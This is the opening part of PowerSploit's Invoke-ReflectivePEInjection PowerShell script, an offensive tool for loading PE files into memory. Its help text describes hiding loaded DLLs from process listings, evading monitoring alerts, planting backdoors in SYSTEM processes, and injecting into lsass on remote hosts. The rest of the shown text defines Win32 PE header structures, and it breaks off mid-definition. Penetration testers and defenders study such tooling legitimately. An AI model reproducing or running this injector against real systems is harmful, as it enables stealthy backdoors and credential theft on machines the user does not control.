function Invoke-ReflectivePEInjection
{
<#
.SYNOPSIS

This script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process, 
or it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints, 
please lead the Notes section (GENERAL NOTES) for information on how to use them.

1.)Reflectively loads a DLL or EXE in to memory of the Powershell process.
Because the DLL/EXE is loaded reflectively, it is not displayed when tools are used to list the DLLs of a running process.

This tool can be run on remote servers by supplying a local Windows PE file (DLL/EXE) to load in to memory on the remote system,
this will load and execute the DLL/EXE in to memory without writing any files to disk.

2.) Reflectively load a DLL in to memory of a remote process.
As mentioned above, the DLL being reflectively loaded won't be displayed when tools are used to list DLLs of the running remote process.

This is probably most useful for injecting backdoors in SYSTEM processes in Session0. Currently, you cannot retrieve output
from the DLL. The script doesn't wait for the DLL to complete execution, and doesn't make any effort to cleanup memory in the 
remote process. 

PowerSploit Function: Invoke-ReflectivePEInjection
Author: Joe Bialek, Twitter: @JosephBialek
Code review and modifications: Matt Graeber, Twitter: @mattifestation
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process.

.PARAMETER PEBytes

A byte array containing a DLL/EXE to load and execute.

.PARAMETER ComputerName

Optional, an array of computernames to run the script on.

.PARAMETER FuncReturnType

Optional, the return type of the function being called in the DLL. Default: Void
	Options: String, WString, Void. See notes for more information.
	IMPORTANT: For DLLs being loaded remotely, only Void is supported.
	
.PARAMETER ExeArgs

Optional, arguments to pass to the executable being reflectively loaded.
	
.PARAMETER ProcName

Optional, the name of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ProcId

Optional, the process ID of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ForceASLR

Optional, will force the use of ASLR on the PE being loaded even if the PE indicates it doesn't support ASLR. Some PE's will work with ASLR even
    if the compiler flags don't indicate they support it. Other PE's will simply crash. Make sure to test this prior to using. Has no effect when
    loading in to a remote process.

.PARAMETER DoNotZeroMZ

Optional, will not wipe the MZ from the first two bytes of the PE. This is to be used primarily for testing purposes and to enable loading the same PE with Invoke-ReflectivePEInjection more than once.
	
.EXAMPLE

Load DemoDLL and run the exported function WStringFunc on Target.local, print the wchar_t* returned by WStringFunc().
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName Target.local

.EXAMPLE

Load DemoDLL and run the exported function WStringFunc on all computers in the file targetlist.txt. Print
	the wchar_t* returned by WStringFunc() from all the computers.
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)

.EXAMPLE

Load DemoEXE and run it locally.
$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4"

.EXAMPLE

Load DemoEXE and run it locally. Forces ASLR on for the EXE.
$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4" -ForceASLR

.EXAMPLE

Refectively load DemoDLL_RemoteProcess.dll in to the lsass process on a remote computer.
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL_RemoteProcess.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcName lsass -ComputerName Target.Local

.NOTES
GENERAL NOTES:
The script has 3 basic sets of functionality:
1.) Reflectively load a DLL in to the PowerShell process
	-Can return DLL output to user when run remotely or locally.
	-Cleans up memory in the PS process once the DLL finishes executing.
	-Great for running pentest tools on remote computers without triggering process monitoring alerts.
	-By default, takes 3 function names, see below (DLL LOADING NOTES) for more info.
2.) Reflectively load an EXE in to the PowerShell process.
	-Can NOT return EXE output to user when run remotely. If remote output is needed, you must use a DLL. CAN return EXE output if run locally.
	-Cleans up memory in the PS process once the DLL finishes executing.
	-Great for running existing pentest tools which are EXE's without triggering process monitoring alerts.
3.) Reflectively inject a DLL in to a remote process.
	-Can NOT return DLL output to the user when run remotely OR locally.
	-Does NOT clean up memory in the remote process if/when DLL finishes execution.
	-Great for planting backdoor on a system by injecting backdoor DLL in to another processes memory.
	-Expects the DLL to have this function: void VoidFunc(). This is the function that will be called after the DLL is loaded.

DLL LOADING NOTES:

PowerShell does not capture an applications output if it is output using stdout, which is how Windows console apps output.
If you need to get back the output from the PE file you are loading on remote computers, you must compile the PE file as a DLL, and have the DLL
return a char* or wchar_t*, which PowerShell can take and read the output from. Anything output from stdout which is run using powershell
remoting will not be returned to you. If you just run the PowerShell script locally, you WILL be able to see the stdout output from
applications because it will just appear in the console window. The limitation only applies when using PowerShell remoting.

For DLL Loading:
Once this script loads the DLL, it calls a function in the DLL. There is a section near the bottom labeled "YOUR CODE GOES HERE"
I recommend your DLL take no parameters. I have prewritten code to handle functions which take no parameters are return
the following types: char*, wchar_t*, and void. If the function returns char* or wchar_t* the script will output the
returned data. The FuncReturnType parameter can be used to specify which return type to use. The mapping is as follows:
wchar_t*   : FuncReturnType = WString
char*      : FuncReturnType = String
void       : Default, don't supply a FuncReturnType

For the whcar_t* and char_t* options to work, you must allocate the string to the heap. Don't simply convert a string
using string.c_str() because it will be allocaed on the stack and be destroyed when the DLL returns.

The function name expected in the DLL for the prewritten FuncReturnType's is as follows:
WString    : WStringFunc
String     : StringFunc
Void       : VoidFunc

These function names ARE case sensitive. To create an exported DLL function for the wstring type, the function would
be declared as follows:
extern "C" __declspec( dllexport ) wchar_t* WStringFunc()


If you want to use a DLL which returns a different data type, or which takes parameters, you will need to modify
this script to accomodate this. You can find the code to modify in the section labeled "YOUR CODE GOES HERE".

Find a DemoDLL at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectiveDllInjection

.LINK

http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/

Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
Blog on using this script as a backdoor with SQL server: http://www.casaba.com/blog/
#>

[CmdletBinding()]
Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $PEBytes,
	
	[Parameter(Position = 1)]
	[String[]]
	$ComputerName,
	
	[Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
	[String]
	$FuncReturnType = 'Void',
	
	[Parameter(Position = 3)]
	[String]
	$ExeArgs,
	
	[Parameter(Position = 4)]
	[Int32]
	$ProcId,
	
	[Parameter(Position = 5)]
	[String]
	$ProcName,

    [Switch]
    $ForceASLR,

	[Switch]
	$DoNotZeroMZ
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FuncReturnType,
				
		[Parameter(Position = 2, Mandatory = $true)]
		[Int32]
		$ProcId,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
	)
	
	###################################
	##########  Win32 Stuff  ##########
	###################################
	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		#Define all the structures/enums that will be used
		#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


		############    ENUM    ############
		#Enum MachineType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

		#Enum MagicType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

		#Enum SubSystemType
		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

		#Enum DllCharacteristicsType
		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		###########    STRUCT    ###########
		#Struct IMAGE_DATA_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		#Struct IMAGE_FILE_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		#Struct IMAGE_OPTIONAL_HEADER64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		#Struct IMAGE_OPTIONAL_HEADER32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		#Struct IMAGE_NT_HEADERS64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
		
		#Struct IMAGE_NT_HEADERS32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		#Struct IMAGE_DOS_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		#Struct IMAGE_SECTION_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
